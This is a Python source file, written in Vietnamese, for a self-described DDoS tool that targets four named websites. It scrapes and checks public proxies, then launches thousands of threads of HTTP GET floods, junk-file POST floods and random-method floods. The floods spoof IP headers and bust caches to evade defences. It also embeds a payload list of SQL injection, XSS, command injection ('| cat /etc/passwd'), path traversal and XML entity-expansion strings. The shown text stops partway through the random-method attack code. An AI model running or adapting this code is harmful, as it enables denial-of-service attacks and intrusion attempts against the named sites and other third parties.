# -*- coding: utf-8 -*-
# TOOL DDoS SIÊU MẠNH - CHỌN MỤC TIÊU - GIAO DIỆN MÀU - ANIMATION - TIẾNG VIỆT
# Tác giả: palofsc
# Phiên bản: 7.0 VIETNAMESE ANNIHILATOR

import requests
import threading
import queue
import time
import random
import socket
import ssl
import sys
import os
import re
import signal
import urllib3
import string
import hashlib
import json
import subprocess
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlencode
import warnings
warnings.filterwarnings('ignore')
urllib3.disable_warnings()

# ============================================
# MÃ MÀU ANSI CHO TERMINAL
# ============================================
class Cl:
    R = '\033[91m'   # Đỏ
    G = '\033[92m'   # Xanh lá
    Y = '\033[93m'   # Vàng
    B = '\033[94m'   # Xanh dương
    M = '\033[95m'   # Tím
    C = '\033[96m'   # Cyan
    W = '\033[97m'   # Trắng
    BOLD = '\033[1m'
    UNDER = '\033[4m'
    RESET = '\033[0m'
    BG_R = '\033[41m'
    BG_G = '\033[42m'
    BG_Y = '\033[43m'
    BG_B = '\033[44m'
    BG_M = '\033[45m'
    BG_C = '\033[46m'

# ============================================
# DANH SÁCH MỤC TIÊU CÓ SẴN
# ============================================
TARGET_POOL = {
    "1": {
        "name": "t4xcheatgamer.x10.mx",
        "hosts": ["www.t4xcheatgamer.x10.mx"],
        "urls": [
            "https://www.t4xcheatgamer.x10.mx/dll_download.php",
            "https://www.t4xcheatgamer.x10.mx/login.php",
            "https://www.t4xcheatgamer.x10.mx/dll_status.php",
            "https://www.t4xcheatgamer.x10.mx/index.php",
            "https://www.t4xcheatgamer.x10.mx/download.php",
            "https://www.t4xcheatgamer.x10.mx/admin/",
            "https://www.t4xcheatgamer.x10.mx/wp-admin/",
            "https://www.t4xcheatgamer.x10.mx/wp-login.php",
            "https://www.t4xcheatgamer.x10.mx/xmlrpc.php",
            "https://www.t4xcheatgamer.x10.mx/.env",
            "https://www.t4xcheatgamer.x10.mx/phpinfo.php",
            "https://www.t4xcheatgamer.x10.mx/backup/",
            "https://www.t4xcheatgamer.x10.mx/config.php",
            "https://www.t4xcheatgamer.x10.mx/api/",
            "https://www.t4xcheatgamer.x10.mx/upload.php",
            "https://www.t4xcheatgamer.x10.mx/test.php",
            "https://www.t4xcheatgamer.x10.mx/info.php",
            "https://www.t4xcheatgamer.x10.mx/status.php",
        ]
    },
    "2": {
        "name": "cshellvn.vercel.app",
        "hosts": ["cshellvn.vercel.app"],
        "urls": [
            "https://cshellvn.vercel.app/getkey",
            "https://cshellvn.vercel.app/index.html",
            "https://cshellvn.vercel.app/download",
            "https://cshellvn.vercel.app/api/",
            "https://cshellvn.vercel.app/_next/",
            "https://cshellvn.vercel.app/static/",
            "https://cshellvn.vercel.app/favicon.ico",
            "https://cshellvn.vercel.app/robots.txt",
            "https://cshellvn.vercel.app/sitemap.xml",
            "https://cshellvn.vercel.app/api/auth",
            "https://cshellvn.vercel.app/api/user",
            "https://cshellvn.vercel.app/api/data",
            "https://cshellvn.vercel.app/api/config",
            "https://cshellvn.vercel.app/__nextjs_original-stack-frame",
            "https://cshellvn.vercel.app/_next/data/",
            "https://cshellvn.vercel.app/_next/static/",
        ]
    },
    "3": {
        "name": "darkmatterbin.unaux.com",
        "hosts": ["darkmatterbin.unaux.com"],
        "urls": [
            "https://darkmatterbin.unaux.com/",
            "https://darkmatterbin.unaux.com/index.php",
            "https://darkmatterbin.unaux.com/login.php",
            "https://darkmatterbin.unaux.com/download.php",
            "https://darkmatterbin.unaux.com/admin/",
            "https://darkmatterbin.unaux.com/wp-admin/",
            "https://darkmatterbin.unaux.com/wp-login.php",
            "https://darkmatterbin.unaux.com/xmlrpc.php",
            "https://darkmatterbin.unaux.com/.env",
            "https://darkmatterbin.unaux.com/phpinfo.php",
            "https://darkmatterbin.unaux.com/api/",
            "https://darkmatterbin.unaux.com/upload.php",
            "https://darkmatterbin.unaux.com/backup/",
            "https://darkmatterbin.unaux.com/config.php",
            "https://darkmatterbin.unaux.com/test.php",
        ]
    },
    "4": {
        "name": "getkey.liveblog365.com",
        "hosts": ["getkey.liveblog365.com"],
        "urls": [
            "https://getkey.liveblog365.com/",
            "https://getkey.liveblog365.com/index.php",
            "https://getkey.liveblog365.com/login.php",
            "https://getkey.liveblog365.com/download.php",
            "https://getkey.liveblog365.com/admin/",
            "https://getkey.liveblog365.com/wp-admin/",
            "https://getkey.liveblog365.com/wp-login.php",
            "https://getkey.liveblog365.com/xmlrpc.php",
            "https://getkey.liveblog365.com/.env",
            "https://getkey.liveblog365.com/phpinfo.php",
            "https://getkey.liveblog365.com/api/",
            "https://getkey.liveblog365.com/getkey",
            "https://getkey.liveblog365.com/upload.php",
            "https://getkey.liveblog365.com/status.php",
        ]
    }
}

# Cấu hình chung
PROXY_FILE = "proxies_raw.txt"
PROXY_LIVE_FILE = "proxies_live.txt"
current_proxy_manager = None
AUTO_RESTART = True
TARGET_PORT = 443

# Tham số quét proxy
PROXY_SOURCES = [
    "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
    "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=https&timeout=10000&country=all&ssl=all&anonymity=all",
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt",
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt",
    "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
    "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/https.txt",
    "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
    "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks4.txt",
    "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks5.txt",
    "https://www.proxy-list.download/api/v1/get?type=http",
    "https://www.proxy-list.download/api/v1/get?type=https",
    "https://spys.me/proxy.txt",
    "https://free-proxy-list.net/",
    "https://www.sslproxies.org/",
    "https://www.us-proxy.org/",
    "https://www.socks-proxy.net/",
    "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-http.txt",
    "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-https.txt",
    "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-socks4.txt",
    "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-socks5.txt",
    "https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS_RAW.txt",
    "https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTP_RAW.txt",
    "https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt",
    "https://raw.githubusercontent.com/Zaeem20/FREE_PROXIES_LIST/master/http.txt",
    "https://raw.githubusercontent.com/Zaeem20/FREE_PROXIES_LIST/master/https.txt",
    "https://raw.githubusercontent.com/Zaeem20/FREE_PROXIES_LIST/master/socks4.txt",
    "https://raw.githubusercontent.com/Zaeem20/FREE_PROXIES_LIST/master/socks5.txt",
    "https://raw.githubusercontent.com/ALIILAPRO/Proxy/main/http.txt",
    "https://raw.githubusercontent.com/ALIILAPRO/Proxy/main/https.txt",
    "https://raw.githubusercontent.com/saisuiu/Lionkings-Proxy-List/main/proxies/http.txt",
    "https://raw.githubusercontent.com/saisuiu/Lionkings-Proxy-List/main/proxies/https.txt",
]

PROXY_CHECK_TIMEOUT = 2
PROXY_CHECK_THREADS = 500
MAX_RETRIES = 1
SAVE_INTERVAL = 500
TEST_URLS = [
    "http://httpbin.org/ip",
    "https://api.ipify.org?format=json",
    "http://ip-api.com/json/",
]

# Tham số DDoS - TỐI ĐA CÔNG LỰC
HTTP_FLOOD_THREADS = 7000
SLOWLORIS_THREADS = 1500
POST_FLOOD_THREADS = 4000
RANDOM_METHOD_THREADS = 5000
VERCEL_BYPASS_THREADS = 4000
CACHE_BYPASS_THREADS = 4000
TCP_SYN_FLOOD = True
DDOS_DELAY = 0
ROTATE_PROXY_EVERY = 1

HTTP_METHODS = [
    "GET", "POST", "HEAD", "PUT", "DELETE", "OPTIONS", "PATCH", "TRACE", "CONNECT",
    "PURGE", "DEBUG", "TRACK", "LOCK", "UNLOCK", "PROPFIND", "PROPPATCH", "MKCOL",
    "COPY", "MOVE", "SEARCH", "BIND", "UNBIND", "REBIND", "LABEL", "LINK", "UNLINK",
    "MERGE", "BASELINE", "CHECKIN", "CHECKOUT", "UNCHECKOUT", "VERSION-CONTROL",
    "REPORT", "UPDATE", "REDIRECT", "FOOBAR", "RANDOM123", "NULL", "FAKE",
    "BREW", "WHEN", "UNBREW", "POST2GET", "GET2POST",
]

CONTENT_TYPES = [
    "application/x-www-form-urlencoded",
    "multipart/form-data",
    "application/json",
    "application/xml",
    "text/xml",
    "text/plain",
    "text/html",
    "application/octet-stream",
    "application/x-httpd-php",
    "application/pdf",
    "image/jpeg",
    "image/png",
    "image/gif",
    "video/mp4",
    "audio/mpeg",
    "application/zip",
    "application/gzip",
    "application/x-tar",
    "application/x-7z-compressed",
    "application/x-rar-compressed",
    "application/x-shockwave-flash",
    "application/vnd.ms-excel",
    "application/vnd.ms-powerpoint",
    "application/msword",
    "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
    "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
    "application/java-archive",
    "application/x-msdownload",
    "application/x-python-code",
    "application/x-perl",
    "application/x-ruby",
    "application/x-php",
    "application/x-javascript",
    "text/css",
    "text/csv",
    "application/x-yaml",
    "application/x-www-form-urlencoded; charset=UTF-8",
    "application/json; charset=UTF-8",
    "application/xml; charset=UTF-8",
]

QUERY_PARAMS_POOL = [
    "download", "file_id", "id", "action", "mode", "type", "token", "key", "hash",
    "checksum", "version", "user", "pass", "username", "password", "login", "email",
    "admin", "root", "debug", "test", "page", "sort", "order", "limit", "offset",
    "search", "q", "query", "cmd", "exec", "command", "shell", "eval", "include",
    "require", "file", "path", "dir", "folder", "url", "redirect", "return", "next",
    "callback", "jsonp", "format", "output", "api_key", "apikey", "auth", "session",
    "cookie", "csrf", "nonce", "timestamp", "time", "date", "rand", "random",
    "s", "p", "a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m",
    "n", "o", "r", "t", "u", "v", "w", "x", "y", "z",
    "_vercel_no_cache", "_rsc", "_next", "buildId",
]

PAYLOADS = [
    "' OR '1'='1", "' OR 1=1--", "admin'--", "1' OR '1'='1'--",
    "1; DROP TABLE users--", "' UNION SELECT * FROM users--",
    "1 AND 1=1", "1 AND 1=2", "' OR 'x'='x",
    "<script>alert(1)</script>", "<img src=x onerror=alert(1)>",
    "javascript:alert(1)", "<svg/onload=alert(1)>",
    "; ls -la", "| cat /etc/passwd", "`id`", "$(whoami)",
    "../../../etc/passwd", "..\\..\\..\\windows\\system32",
    ''.join(random.choices(string.ascii_letters + string.digits, k=random.randint(50, 500))),
    ''.join(random.choices(string.printable, k=random.randint(100, 1000))),
    "\x00" * random.randint(100, 1000),
    '<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ELEMENT lolz (#PCDATA)><!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;"><!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">]><lolz>&lol2;</lolz>',
    '{"__proto__": {"polluted": true}}',
    'constructor.prototype.polluted=true',
]

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
    "Mozilla/5.0 (Linux; Android 13; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 OPR/106.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.120 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Googlebot/2.1 (+http://www.google.com/bot.html)",
    "Bingbot/2.0 (+http://www.bing.com/bingbot.htm)",
    "Baiduspider/2.0 (+http://www.baidu.com/search/spider.htm)",
    "YandexBot/3.0 (+http://yandex.com/bots)",
    "facebookexternalhit/1.1",
    "Twitterbot/1.0",
    "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)",
    "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)",
    "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)",
    "Opera/9.80 (Windows NT 6.1; U; en) Presto/2.8.131 Version/11.11",
    "curl/7.68.0",
    "Wget/1.20.3 (linux-gnu)",
    "python-requests/2.31.0",
    "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)",
    "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)",
]

REFERERS = [
    "https://www.google.com/search?q=cheat+game+download",
    "https://www.google.com/search?q=t4x+cheat+gamer",
    "https://www.bing.com/search?q=free+game+cheats",
    "https://www.reddit.com/r/cheats/",
    "https://www.youtube.com/watch?v=cheat_tutorial",
    "https://www.facebook.com/groups/gamecheats/",
    "https://discord.com/channels/gamecheats/",
    "https://t.me/gamecheats",
    "https://www.tiktok.com/@cheatgamer",
    "https://github.com/gamecheats/",
    "https://www.twitch.tv/cheatstream",
    "https://twitter.com/cheatgamer",
    "https://www.instagram.com/cheatgamer/",
    "https://www.pinterest.com/gamecheats/",
    "https://duckduckgo.com/?q=cheat+download",
    "https://www.baidu.com/s?wd=cheat",
    "https://yandex.ru/search/?text=cheat",
    "https://search.yahoo.com/search?p=cheat",
    "",
    "https://cshellvn.vercel.app/",
    "https://www.t4xcheatgamer.x10.mx/",
    "https://darkmatterbin.unaux.com/",
    "https://getkey.liveblog365.com/",
]

# ============================================
# HÀM XỬ LÝ TÍN HIỆU DỪNG
# ============================================
def signal_handler(signum, frame):
    global current_proxy_manager
    print(f"\n\n{Cl.R}[!] ĐÃ NHẬN TÍN HIỆU DỪNG - ĐANG LƯU PROXY...{Cl.RESET}")
    if current_proxy_manager and current_proxy_manager.live_proxies:
        try:
            with open(PROXY_LIVE_FILE, "w") as f:
                for proxy in current_proxy_manager.live_proxies:
                    f.write(proxy + "\n")
            print(f"{Cl.G}[+] ĐÃ LƯU {len(current_proxy_manager.live_proxies)} PROXY LIVE{Cl.RESET}")
        except Exception as e:
            print(f"{Cl.R}[-] LỖI: {str(e)}{Cl.RESET}")
    if AUTO_RESTART:
        print(f"{Cl.Y}[!] AUTO RESTART: Đang khởi động lại...{Cl.RESET}")
        try:
            subprocess.Popen([sys.executable] + sys.argv, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except:
            pass
    print(f"{Cl.R}[!] Thoát...{Cl.RESET}\n")
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)
signal.signal(signal.SIGTERM, signal_handler)

# ============================================
# HÀM HOẠT ẢNH LOADING
# ============================================
def animate_loading(text, duration=2):
    """Hiệu ứng loading xoay"""
    frames = ["⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"]
    end_time = time.time() + duration
    i = 0
    while time.time() < end_time:
        sys.stdout.write(f"\r{Cl.C}{frames[i % len(frames)]} {text}...{Cl.RESET}")
        sys.stdout.flush()
        time.sleep(0.08)
        i += 1
    sys.stdout.write(f"\r{Cl.G}✓ {text} - Hoàn tất!{Cl.RESET}\n")
    sys.stdout.flush()

def animate_attack_status():
    """Hiệu ứng trạng thái tấn công"""
    frames = ["▁", "▂", "▃", "▄", "▅", "▆", "▇", "█", "▇", "▆", "▅", "▄", "▃", "▂", "▁"]
    chars = ["║", "║", "║", "║", "║"]
    while True:
        for i in range(len(frames)):
            bar = ""
            for j in range(5):
                idx = (i + j * 3) % len(frames)
                bar += frames[idx]
            sys.stdout.write(f"\r{Cl.R}[{bar}]{Cl.RESET} ĐANG TẤN CÔNG...")
            sys.stdout.flush()
            time.sleep(0.1)

# ============================================
# LỚP QUẢN LÝ PROXY
# ============================================
class ProxyManager:
    def __init__(self):
        self.live_proxies = []
        self.lock = threading.Lock()
        self.total_scanned = 0
        self.total_live = 0
        
    def fetch_proxies_from_source(self, url):
        proxies = []
        try:
            response = requests.get(url, timeout=15, headers={"User-Agent": random.choice(USER_AGENTS)})
            content = response.text
            ip_port_pattern = re.compile(r'\b(?:\d{1,3}\.){3}\d{1,3}:\d{2,5}\b')
            matches = ip_port_pattern.findall(content)
            for match in matches:
                proxies.append(match.strip())
            print(f"{Cl.G}[+] Đã quét {url}: tìm thấy {len(matches)} proxy{Cl.RESET}")
        except:
            pass
        return proxies
    
    def scan_all_sources(self):
        print(f"\n{Cl.Y}{'='*60}{Cl.RESET}")
        print(f"{Cl.BOLD}[*] BẮT ĐẦU QUÉT PROXY TỪ {len(PROXY_SOURCES)} NGUỒN...{Cl.RESET}")
        print(f"{Cl.Y}{'='*60}{Cl.RESET}\n")
        all_proxies = set()
        with ThreadPoolExecutor(max_workers=30) as executor:
            futures = {executor.submit(self.fetch_proxies_from_source, url): url for url in PROXY_SOURCES}
            for future in as_completed(futures):
                result = future.result()
                all_proxies.update(result)
        with open(PROXY_FILE, "w") as f:
            for proxy in all_proxies:
                f.write(proxy + "\n")
        print(f"\n{Cl.G}[+] TỔNG CỘNG: {len(all_proxies)} proxy thô đã được lưu vào {PROXY_FILE}{Cl.RESET}")
        return list(all_proxies)
    
    def check_proxy(self, proxy):
        proxy_dict = {"http": f"http://{proxy}", "https": f"http://{proxy}"}
        for test_url in TEST_URLS:
            for _ in range(MAX_RETRIES):
                try:
                    response = requests.get(test_url, proxies=proxy_dict, timeout=PROXY_CHECK_TIMEOUT,
                                            headers={"User-Agent": random.choice(USER_AGENTS)}, verify=False)
                    if response.status_code == 200:
                        return True, proxy
                except:
                    continue
        return False, proxy
    
    def check_all_proxies(self, proxy_list):
        global current_proxy_manager
        current_proxy_manager = self
        print(f"\n{Cl.Y}{'='*60}{Cl.RESET}")
        print(f"{Cl.BOLD}[*] BẮT ĐẦU KIỂM TRA {len(proxy_list)} PROXY...{Cl.RESET}")
        print(f"{Cl.Y}{'='*60}{Cl.RESET}\n")
        live_proxies = []
        self.total_scanned = len(proxy_list)
        checked = 0
        with ThreadPoolExecutor(max_workers=PROXY_CHECK_THREADS) as executor:
            futures = {executor.submit(self.check_proxy, proxy): proxy for proxy in proxy_list}
            for future in as_completed(futures):
                try:
                    is_live, proxy = future.result(timeout=PROXY_CHECK_TIMEOUT + 2)
                except:
                    is_live, proxy = False, ""
                checked += 1
                if is_live:
                    live_proxies.append(proxy)
                    with self.lock:
                        self.total_live += 1
                if checked % 1000 == 0 or checked == self.total_scanned:
                    pct = self.total_live/checked*100 if checked > 0 else 0
                    print(f"\r{Cl.C}[*] Tiến độ: {checked}/{self.total_scanned} | Live: {self.total_live} | Tỉ lệ: {pct:.1f}%{Cl.RESET}", end="")
                if checked % SAVE_INTERVAL == 0:
                    with open(PROXY_LIVE_FILE, "w") as f:
                        for p in live_proxies:
                            f.write(p + "\n")
                    print(f"\n{Cl.G}[!] Đã tự động lưu {len(live_proxies)} proxy vào {PROXY_LIVE_FILE}{Cl.RESET}")
        with open(PROXY_LIVE_FILE, "w") as f:
            for proxy in live_proxies:
                f.write(proxy + "\n")
        self.live_proxies = live_proxies
        print(f"\n\n{Cl.G}[+] ĐÃ KIỂM TRA XONG: {len(live_proxies)} proxy live đã được lưu vào {PROXY_LIVE_FILE}{Cl.RESET}")
        return live_proxies
    
    def get_random_proxy(self):
        if not self.live_proxies:
            return None
        proxy = random.choice(self.live_proxies)
        return {"http": f"http://{proxy}", "https": f"http://{proxy}"}
    
    def reload_live_proxies(self):
        if os.path.exists(PROXY_LIVE_FILE):
            with open(PROXY_LIVE_FILE, "r") as f:
                self.live_proxies = [line.strip() for line in f if line.strip()]
            print(f"{Cl.G}[+] Đã tải {len(self.live_proxies)} proxy live từ file{Cl.RESET}")
            return self.live_proxies
        return []

# ============================================
# LỚP TẤN CÔNG CƠ SỞ
# ============================================
class AttackBase:
    def __init__(self, proxy_manager, target_hosts, target_urls):
        self.pm = proxy_manager
        self.hosts = target_hosts
        self.urls = target_urls
        self.lock = threading.Lock()
        self.running = False
        self.counter = 0
        self.success = 0
        self.fail = 0

# ============================================
# HTTP GET FLOOD
# ============================================
class HTTPFlood(AttackBase):
    def start(self, threads=HTTP_FLOOD_THREADS):
        self.running = True
        print(f"{Cl.B}[*] HTTP GET FLOOD: {threads} luồng...{Cl.RESET}")
        for i in range(threads):
            t = threading.Thread(target=self.worker, daemon=True)
            t.start()
            if i % 500 == 0:
                time.sleep(0.005)
    
    def worker(self):
        session = requests.Session()
        req_counter = 0
        while self.running:
            try:
                if req_counter % ROTATE_PROXY_EVERY == 0:
                    proxy = self.pm.get_random_proxy()
                target = random.choice(self.urls)
                # Cache buster
                params = {hashlib.md5(os.urandom(8)).hexdigest()[:10]: random.randint(100000, 999999) for _ in range(random.randint(1, 5))}
                url = target + "?" + urlencode(params) + f"&_={random.randint(100000000, 999999999)}"
                headers = {
                    "User-Agent": random.choice(USER_AGENTS),
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                    "Accept-Language": random.choice(["en-US,en;q=0.9", "vi-VN,vi;q=0.9,en;q=0.8"]),
                    "Accept-Encoding": "gzip, deflate, br",
                    "Referer": random.choice(REFERERS),
                    "Connection": "keep-alive",
                    "Cache-Control": "no-cache, no-store, must-revalidate",
                    "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}",
                    "X-Real-IP": f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}",
                }
                response = session.get(url, headers=headers, proxies=proxy, timeout=10, verify=False, stream=True)
                response.content[:4096]
                with self.lock:
                    self.counter += 1
                    self.success += 1
                    if self.counter % 3000 == 0:
                        print(f"\r{Cl.B}[GET] {self.counter} yêu cầu | OK: {self.success} | Fail: {self.fail}{Cl.RESET}", end="")
                req_counter += 1
            except:
                with self.lock:
                    self.fail += 1
                    self.counter += 1
                req_counter += 1
                continue

# ============================================
# POST FLOOD (UPLOAD FILE RÁC)
# ============================================
class PostFlood(AttackBase):
    def start(self, threads=POST_FLOOD_THREADS):
        self.running = True
        print(f"{Cl.M}[*] POST UPLOAD FLOOD: {threads} luồng (file 1-10MB)...{Cl.RESET}")
        for i in range(threads):
            t = threading.Thread(target=self.worker, daemon=True)
            t.start()
            if i % 300 == 0:
                time.sleep(0.01)
    
    def worker(self):
        while self.running:
            try:
                proxy = self.pm.get_random_proxy()
                target = random.choice(self.urls)
                # File rác 1-10MB
                fake_file = os.urandom(random.randint(1024*1024, 1024*1024*10))
                files = {"file": (f"payload_{random.randint(1,99999)}.bin", fake_file, "application/octet-stream")}
                data = {}
                for _ in range(random.randint(5, 20)):
                    data[random.choice(QUERY_PARAMS_POOL)] = hashlib.md5(os.urandom(16)).hexdigest()
                headers = {
                    "User-Agent": random.choice(USER_AGENTS),
                    "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}",
                    "Content-Type": "multipart/form-data",
                }
                response = requests.post(target, files=files, data=data, headers=headers, proxies=proxy, timeout=120, verify=False)
                with self.lock:
                    self.counter += 1
                    self.success += 1
                    if self.counter % 300 == 0:
                        print(f"\r{Cl.M}[POST] {self.counter} file upload | OK: {self.success}{Cl.RESET}", end="")
            except:
                with self.lock:
                    self.fail += 1
                pass

# ============================================
# ULTRA RANDOM ATTACK (ĐA METHOD)
# ============================================
class UltraRandomAttack(AttackBase):
    def start(self, threads=RANDOM_METHOD_THREADS):
        self.running = True
        print(f"{Cl.Y}[*] ULTRA RANDOM: {threads} luồng | {len(HTTP_METHODS)} Methods | {len(CONTENT_TYPES)} Content-Types...{Cl.RESET}")
        for i in range(threads):
            t = threading.Thread(target=self.worker, daemon=True)
            t.start()
            if i % 500 == 0:
                time.sleep(0.005)
    
    def worker(self):
        session = requests.Session()
        while self.running:
            try:
                proxy = self.pm.get_random_proxy()
                # URL với nhiều tham số ngẫu nhiên
                target = random.choice(self.urls)
                params = {}
                for _ in range(random.randint(5, 25)):
                    key = hashlib.md5(os.urandom(8)).hexdigest()[:12]
                    value = hashlib.sha256(os.urandom(16)).hexdigest()[:20]
                    params[key] = value
                url = target + "?" + urlencode(params)
                
                method = random.choice(HTTP_METHODS)
                headers = {
                    "User-Agent": random.choice(USER_AGENTS),
                    "Accept": random.choice(["text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "application/json", "*/*"]),
                    "Accept-Language": random.choice(["en-US,en;q=0.9", "vi-VN,vi;q=0.9,en;q=0.8", "*"]),
                    "Accept-Encoding": random.choice(["gzip, deflate, br", "identity"]),
                    "Referer": random.choice(REFERERS),
                    "Connection": random.choice(["keep-alive", "close"]),
                    "Cache-Control": "no-cache, no-store",
                    "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}",
                    "X-Real-IP": f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}",
                    "X-Client-IP": f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}",
                    "Content-Type": random.choice(CONTENT_TYPES),
                    "X-Request-ID": hashlib.md5(os.urandom(16)).hexdigest(),
                }
                # Thêm header rác
                for _ in range(random.randint(0, 10)):
                    headers[f"X-Random-{random.randint(1,99999)}"] = os.urandom(random.randint(100, 2000)).hex()
                
                body = None
                if method in ["POST", "PUT", "PATCH", "MERGE", "CHECKIN", "CHECKOUT"]:
                    body_type = random.choice(["json", "urlencoded", "raw", "xml"])
                    if body_type == "json":
                        body = json.dumps({hashlib.md5(os.urandom(8)).hexdigest()[:10]: random.choice(PAYLOADS) for _ in range(random.randint(1, 15))})
                    elif body_type == "urlencoded":
                        body = urlencode({random.choice(QUERY_PARAMS_POOL): random.choice(PAYLOADS) for _ in range(random.randint(1, 20))})
                    elif body_type == "xml":
                        body = '<?xml version="1.0"?><root>' + ''.join([f'<{random.choice(QUERY_PARAMS_POOL)}>{random.choice(PAYLOADS)}</{random.choice(QUERY_PARAMS_POOL)}>' for _ in range(random.randint(1, 10))]) + '</root>'
                    else:
                        body = os.urandom(random.randint(100, 1024*500))
                
                response = session.request(method, url, headers=headers, data=body, proxies=proxy, timeout=10, verify=False, stream=True)
                response.content[:4096]
                with self.lock:
                    self.counter += 1
                    self.success += 1
                    if self.counter % 5000 == 0:
                        print(f"\r{Cl.Y}[ULTRA] {self.counter} yêu cầu | OK: {self.success} | Fail: {self.fail}{Cl.RESET}", end="")
